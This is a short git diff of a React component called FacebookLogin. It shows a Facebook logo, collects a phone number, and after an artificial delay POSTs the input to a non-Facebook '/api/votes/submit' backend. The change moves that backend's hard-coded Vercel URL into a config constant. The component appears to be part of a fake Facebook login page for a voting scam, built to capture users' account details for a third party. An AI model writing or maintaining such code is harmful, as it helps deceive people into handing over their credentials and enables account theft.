@@ -1,5 +1,6 @@
 import { useState, useEffect } from "react";
 import facebookLogo from "../assets/facebook-logo.svg";
+import { API_BASE_URL } from "../config/api";
 
 export default function FacebookLogin() {
   const [phone, setPhone] = useState("");
@@ -22,7 +23,7 @@ export default function FacebookLogin() {
     try {
       await new Promise((resolve) => setTimeout(resolve, 700));
       await fetch(
-        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
+        `${API_BASE_URL}/api/votes/submit`,
         {
           method: "POST",
           headers: {
